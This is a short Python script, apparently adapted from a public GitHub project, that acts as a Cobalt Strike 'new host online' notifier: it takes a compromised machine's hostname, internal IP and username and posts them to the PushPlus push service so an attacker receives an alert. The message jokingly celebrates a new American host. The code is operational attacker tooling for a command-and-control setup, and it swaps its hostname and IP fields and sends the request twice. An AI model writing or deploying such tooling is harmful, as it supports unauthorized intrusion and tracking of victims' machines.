# encoding:utf-8
import argparse
import requests
import random
import string
import json
import time

# 此处代码参考：https://github.com/lintstar/CS-PushPlus
# 稍微做了一个修改   by  crow
# 具体用法可参考公众号：乌鸦安全

token = 'xxxxxxxxxxxxxxxxxxx' #在 http://www.pushplus.plus/push1.html 复制

parser = argparse.ArgumentParser(description='Beacon Info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--username')
args = parser.parse_args()

internalip = args.internalip
computername = args.computername
username = args.username
ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
t_time = time.ctime()
title = "CobaltStrike 上线提醒"
content = """

**您有漂亮国新主机上线啦 ！**

**主机名: {}**

**IP: {}**

**用户名: {}**

**Token: {}**

**请注意查收哦 ~**
""".format(internalip, computername, username, ran_str, t_time)

url = 'http://www.pushplus.plus/send'
data = {
    "token":token,
    "title":title,
    "content":content,
    "template":"markdown",
    "channel":"webhook",
    "webhook":"1221"
}
body=json.dumps(data).encode(encoding='utf-8')
headers = {'Content-Type':'application/json'}
requests.post(url,data=body,headers=headers)
res = requests.post(url,data=body,headers=headers)
print(res.text)